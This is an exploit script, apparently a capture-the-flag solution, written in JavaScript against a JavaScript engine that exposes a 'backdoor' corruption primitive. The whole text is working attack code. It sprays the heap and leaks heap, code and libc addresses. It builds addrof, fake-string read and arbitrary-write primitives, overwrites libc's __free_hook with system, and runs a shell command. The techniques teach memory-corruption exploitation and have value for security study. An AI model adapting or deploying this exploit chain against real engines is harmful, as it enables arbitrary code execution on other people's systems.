function hex(B){for(var r="",t=0;t<B.length;t++)r+=""+B.charCodeAt(t).toString(16);return r}JRS=function(){function numberToBinString(B,r){for(var t=[],n=null;r--;)n=B%2,t[r]=n,B-=n,B/=2;return t.join("")}function HexFn(B){return parseInt(B,2).toString(16)}function binStringToHexString(B){return B.replace(/(\d{4})/g,HexFn)}function hexStringToBinString(B){for(var r="",t=0;t<B.length-1;t+=2)r+=numberToBinString(parseInt(B.substring(t,t+2),16),8);return r}function SngFwd(B,r,t){var n={};return t=Math.pow(2,23)*t+.5,n.a=255&t,n.b=255&t>>8,n.c=127&t>>16|(1&r)<<7,n.d=B<<7|r>>1,n}function DblFwd(B,r,t){var n={};return t=Math.pow(2,52)*t,n.a=65535&t,n.b=65535&t>>16,t/=Math.pow(2,32),n.c=65535&t,n.d=B<<15|r<<4|15&t>>16,n}function CVTFWD(B,r){var t=null,n=null,a=null,e=null,o="",i={32:{d:127,c:128,b:0,a:0},64:{d:32752,c:0,b:0,a:0}},s={32:8,64:11}[B],u=B-s-1;if(isNaN(r)&&((e=i[B]).a=1,t=!1,n=Math.pow(2,s)-1,a=Math.pow(2,-u)),e||(t=r<0||1/r<0,isFinite(r)||(e=i[B],t&&(e.d+=1<<B/4-1),n=Math.pow(2,s)-1,a=0)),!e){for(n={32:127,64:1023}[B],a=Math.abs(r);a>=2;)n++,a/=2;for(;a<1&&n>0;)n--,a*=2;n<=0&&(a/=2,o="Zero or Denormal"),32==B&&n>254&&(o="Too big for Single",e={d:t?255:127,c:128,b:0,a:0},n=Math.pow(2,s)-1,a=0)}return e||(e={32:SngFwd,64:DblFwd}[B](t,n,a)),e.sgn=+t,e.exp=numberToBinString(n,s),a=a%1*Math.pow(2,u),32==B&&(a=Math.floor(a+.5)),e.mnt=numberToBinString(a,u),e.nb01=o,e}function CVTREV(B){var r={32:8,64:11}[B.length],t=B.match(new RegExp("^(.)(.{"+r+"})(.*)$")),n="1"==t[1]?-1:1;if(!/0/.test(t[2])){var a=/1/.test(t[3])?NaN:n/0;throw new Error("Max Coded "+t[3]+" "+a.toString())}var e=0==+t[2],o=parseInt(t[2],2)-Math.pow(2,r-1)+1;return n*(parseInt(t[3],2)/Math.pow(2,t[3].length)+!e)*Math.pow(2,o+e)}this.doubleToHexString=function(d,size){var NumW=size,Qty=d;with(CVTFWD(NumW,Qty))return binStringToHexString(sgn+exp+mnt)},this.hexStringToDouble=function(B,r){var t=r,n=hexStringToBinString(B);if(new RegExp("^[01]{"+t+"}$").test(n))return CVTREV(n);write(t+" bits 0/1 needed\n")}},jrs=new JRS,gc(),a="BBBBBBBB",str2="BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",obj={};
for(var i=0;i<1024;i++) obj["aaaa"+i]="AAAAAAAA";offset1=1213,backdoor(str2,offset1);for(var leak=void 0,i=0;i<1024;i++)"AAAAAAAA"!=obj["aaaa"+i]&&(leak=obj["aaaa"+i],obj["aaaa"+i]="AAAAAAAA");null==leak&&(write("[-] fail to leak heap_ptr\n"),quit(1));var heap_ptr=parseInt(jrs.doubleToHexString(leak,64),16);function addrof(B){for(var r=0;r<1024;r++)obj["aaaa"+r]=B;for(backdoor(str2,offset1),r=0;r<1024;r++)if(obj["aaaa"+r]!=B)return parseInt(jrs.doubleToHexString(obj["aaaa"+r],64),16);return null}function fakestr(B){for(var r=jrs.hexStringToDouble("0000"+B.toString(16),64),t=0;t<1024;t++)obj["aaaa"+t]=r;backdoor(str2,1533);var n=void 0;for(t=0;t<1024;t++)if(obj["aaaa"+t]!=r)return n=obj["aaaa"+t],obj["aaaa"+t]=B,n;return null}write("heap_ptr @ 0x"+heap_ptr.toString(16)+"\n");var start=heap_ptr-8212;function look_for(B,r){var t=null;for(t=start+r;t<start+73728;t+=16)if(fakestr(t).substring(0,B.length)==B)return t;return null}function read_hex(B){for(var r=encodeURI(fakestr(B)),t="",n=0;n<r.length;)"%"!=r[n]?(t+=hex(r[n]),n+=1):(t+=r.substring(n+1,n+3),n+=3);return t}function leak_ptr(B){for(var r=read_hex(B),t="",n=r.length-2;n>=0;n-=2)t+=r.substring(n,n+2);return parseInt(t,16)}for(ptr=leak_ptr(heap_ptr-20);ptr<17592186044416&&(write("[-] fail to leak code_base\n"),quit(1)),"1d0"!=ptr.toString(16).substring(9,12);)ptr=leak_ptr(ptr+8);code_base=ptr-2298320,write("code_base @ 0x"+code_base.toString(16)+"\n"),libc_base=leak_ptr(code_base+2297808)-137904,write("libc_base @ 0x"+libc_base.toString(16)+"\n"),__free_hook=libc_base+4118760,write("__free_hook @ 0x"+__free_hook.toString(16)+"\n"),system=libc_base+324672,write("system @ 0x"+system.toString(16)+"\n"),lock_addr=libc_base+4114408,gc(),str10=str2+str2,str20=str10+str10,str40=str20+str20,str80=str40+str40,str100=str80+str80,str200=str100+str100,str400=str200+str200,holder={};
for(var i=0;i<2e3;i++)holder["aaaa"+i]=str20.substring(0,32);
gc();

// fill heap again
holder2 = {}
for(var i=0; i<1000; i++) {
	holder2["aaaa"+i] = str20.substring(0, 0x10);
	holder2["aaaaa"+i] = str20.substring(0, 0x4);
}

target = 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'
c = 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'.substring(0, 0x400)
d = 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'.substring(0, 0x400)
e = 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'.substring(0, 0x20)
c = null
delete c
d = null
delete d
e = null
delete e
gc()

function write_where_byte(addr, b) {
	var c = (b & 0xff) + 0x200;
	var x = fakestr(addr-2*c)
	backdoor(x, c);
}

function write_where_ptr(addr, val) {
	var str = "0000" + val.toString(16);
	lo = parseInt(str.substring(8, 16), 16)
	hi = parseInt(str.substring(0, 8), 16)

	for(var i=0; i<4; i++) {
		var c = lo & 0xff;	
		lo = lo >> 8;
		write(c.toString(16)+"\n");
		write_where_byte(addr+i, c);
	}
	for(var i=0; i<4; i++) {
		var c = hi & 0xff;	
		hi = hi >> 8;
		write(c.toString(16)+"\n");
		write_where_byte(addr+4+i, c);
	}
}

// search for the start of heap
var addr = (heap_ptr - (heap_ptr & 0xfff)) + 8
while(1) {
	res = read_hex(addr);
	if(res == null) quit(1);
	if(res == "5102") break;
	addr -= 0x1000;
}
var heap_base = addr - 8;

write("heap_base @ 0x"+heap_base.toString(16)+'\n');

hax = Array(1);
hax[0] = 3.83698281517203e+117;
hax_addr = addrof(hax);
write("hax @ 0x"+hax_addr.toString(16)+'\n');

elem_addr = leak_ptr(hax_addr+8);
write("elem @ 0x"+elem_addr.toString(16)+'\n');

elem_proto_addr = leak_ptr(elem_addr);
write("elem_proto @ 0x"+elem_proto_addr.toString(16)+'\n');

target = __free_hook - 0x20;
write("target @ 0x"+target.toString(16)+'\n');
write_where_byte(lock_addr-1, 0x00);
write_where_byte(hax_addr+0x2f, 0x4);
write_where_ptr(target, elem_proto_addr);
write_where_ptr(hax_addr+8, target);
write_where_byte(hax_addr+0x2f, 0x4);
gc();

a = [1.728668669193839e-306, 1.728668669193839e-306]
hax[0] = jrs.hexStringToDouble("0000"+system.toString(16),64);
a.sort();
hax[0] = jrs.hexStringToDouble("0;echo pwned > output;"+0x4f4242424242.toString(16),64);
